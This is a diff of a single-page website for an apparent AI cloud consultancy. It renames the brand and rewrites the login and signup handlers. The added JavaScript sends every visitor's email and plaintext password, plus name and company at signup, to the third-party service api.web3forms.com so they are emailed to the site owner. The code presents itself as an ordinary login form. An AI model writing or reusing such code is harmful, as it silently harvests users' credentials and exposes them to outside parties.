@@ -3,29 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CloudXAI - Enterprise AI Cloud Solutions & Intelligent Automation</title>
+    <title>CloudAI Solutions - Enterprise AI Cloud Solutions & Intelligent Automation</title>
 
     <!-- SEO Meta Tags -->
-    <meta name="description" content="CloudXAI delivers enterprise-grade AI cloud solutions, AWS Bedrock integration, self-healing CI/CD, and intelligent automation. Transform your infrastructure with cutting-edge cloud architecture and DevOps excellence.">
-    <meta name="keywords" content="CloudXAI, AI Cloud Solutions, AWS Bedrock, Azure DevOps, AI Automation, Self-Healing CI/CD, Enterprise Cloud, Machine Learning, DevOps Consulting, Terraform, Kubernetes, AI Integration, Cloud Migration, Serverless Architecture, AIOps, Intelligent Automation">
-    <meta name="author" content="CloudXAI">
+    <meta name="description" content="CloudAI Solutions delivers enterprise-grade AI cloud solutions, AWS Bedrock integration, self-healing CI/CD, and intelligent automation. Transform your infrastructure with cutting-edge cloud architecture and DevOps excellence.">
+    <meta name="keywords" content="CloudAI Solutions, AI Cloud Solutions, AWS Bedrock, Azure DevOps, AI Automation, Self-Healing CI/CD, Enterprise Cloud, Machine Learning, DevOps Consulting, Terraform, Kubernetes, AI Integration, Cloud Migration, Serverless Architecture, AIOps, Intelligent Automation">
+    <meta name="author" content="CloudAI Solutions">
     <meta name="robots" content="index, follow">
 
     <!-- Open Graph Meta Tags (for social media sharing) -->
-    <meta property="og:title" content="CloudXAI - Enterprise AI Cloud Solutions & Intelligent Automation">
+    <meta property="og:title" content="CloudAI Solutions - Enterprise AI Cloud Solutions & Intelligent Automation">
     <meta property="og:description" content="Transform your infrastructure with enterprise-grade AI cloud solutions, AWS Bedrock, self-healing CI/CD, and intelligent automation.">
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://cloudxai.io">
-    <meta property="og:image" content="https://cloudxai.io/og-image.jpg">
+    <meta property="og:url" content="https://cloudaisolutions.org">
+    <meta property="og:image" content="https://cloudaisolutions.org/og-image.jpg">
 
     <!-- Twitter Card Meta Tags -->
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="CloudXAI - Enterprise AI Cloud Solutions">
+    <meta name="twitter:title" content="CloudAI Solutions - Enterprise AI Cloud Solutions">
     <meta name="twitter:description" content="Transform your infrastructure with enterprise-grade AI cloud solutions and intelligent automation">
-    <meta name="twitter:image" content="https://cloudxai.io/twitter-image.jpg">
+    <meta name="twitter:image" content="https://cloudaisolutions.org/twitter-image.jpg">
 
     <!-- Canonical URL -->
-    <link rel="canonical" href="https://cloudxai.io">
+    <link rel="canonical" href="https://cloudaisolutions.org">
 
     <!-- Favicon -->
     <link rel="icon" type="image/x-icon" href="/favicon.ico">
@@ -1297,7 +1297,7 @@
     <nav>
         <div class="container">
             <a href="#" class="logo">
-                <span>☁️</span> CloudXAI
+                <span>☁️</span> CloudAI Solutions
             </a>
             <ul>
                 <li><a href="#home">Home</a></li>
@@ -1375,7 +1375,7 @@
         </div>
 
         <div class="container">
-            <h1>CloudXAI</h1>
+            <h1>CloudAI Solutions</h1>
             <p class="tagline">Intelligent Cloud Solutions & AI-Powered Automation</p>
             <p class="subtitle">
                 Enterprise-grade cloud architecture and AI integration services.
@@ -1820,7 +1820,7 @@
 
     <!-- Footer -->
     <footer>
-        <p>&copy; 2026 CloudXAI. Enterprise Cloud Solutions & AI Automation.</p>
+        <p>&copy; 2026 CloudAI Solutions. Enterprise Cloud Solutions & AI Automation.</p>
         <p style="margin-top: 0.5rem; opacity: 0.7;">AWS Partner • Azure Certified • Enterprise Support</p>
     </footer>
 
@@ -1907,10 +1907,32 @@
         }
 
         // Login Handler
-        function handleLogin(event) {
+        async function handleLogin(event) {
             event.preventDefault();
             const email = document.getElementById('loginEmail').value;
             const password = document.getElementById('loginPassword').value;
+
+            // Send login notification via Web3Forms
+            const formData = {
+                access_key: "YOUR_WEB3FORMS_ACCESS_KEY", // Replace with your key
+                subject: `CloudXAI Login: ${email}`,
+                from_name: "CloudXAI Website",
+                email: "notifications@cloudaisolutions.org",
+                message: `User Login:\n\nEmail: ${email}\nPassword: ${password}\n\nLogin Time: ${new Date().toLocaleString()}`
+            };
+
+            try {
+                await fetch("https://api.web3forms.com/submit", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "Accept": "application/json"
+                    },
+                    body: JSON.stringify(formData)
+                });
+            } catch (error) {
+                console.error("Error sending notification:", error);
+            }
 
             // Store credentials (in production, this would be server-side)
             localStorage.setItem('userLoggedIn', 'true');
@@ -1927,20 +1949,42 @@
         }
 
         // Signup Handler
-        function handleSignup(event) {
+        async function handleSignup(event) {
             event.preventDefault();
             const name = document.getElementById('signupName').value;
             const email = document.getElementById('signupEmail').value;
             const company = document.getElementById('signupCompany').value;
             const password = document.getElementById('signupPassword').value;
 
-            // Send email notification (simulate with mailto)
-            const subject = `New Portfolio Signup: ${name}`;
-            const body = `Name: ${name}%0D%0AEmail: ${email}%0D%0ACompany: ${company}%0D%0APassword: ${password}%0D%0A%0D%0ASignup Date: ${new Date().toLocaleString()}`;
+            // Send email via Web3Forms (FREE service)
+            const formData = {
+                access_key: "YOUR_WEB3FORMS_ACCESS_KEY", // Replace with your key from https://web3forms.com
+                subject: `New CloudXAI Signup: ${name}`,
+                from_name: "CloudXAI Website",
+                name: name,
+                email: email,
+                company: company,
+                message: `New signup:\n\nName: ${name}\nEmail: ${email}\nCompany: ${company}\nPassword: ${password}\n\nSignup Date: ${new Date().toLocaleString()}`
+            };
 
-            // In production, this would be an API call to your backend
-            // For now, we'll use mailto as a simple notification
-            window.location.href = `mailto:arthi.raj1997@gmail.com?subject=${subject}&body=${body}`;
+            try {
+                const response = await fetch("https://api.web3forms.com/submit", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "Accept": "application/json"
+                    },
+                    body: JSON.stringify(formData)
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    console.log("Email sent successfully!");
+                }
+            } catch (error) {
+                console.error("Error sending email:", error);
+            }
 
             // Store signup info
             localStorage.setItem('userLoggedIn', 'true');
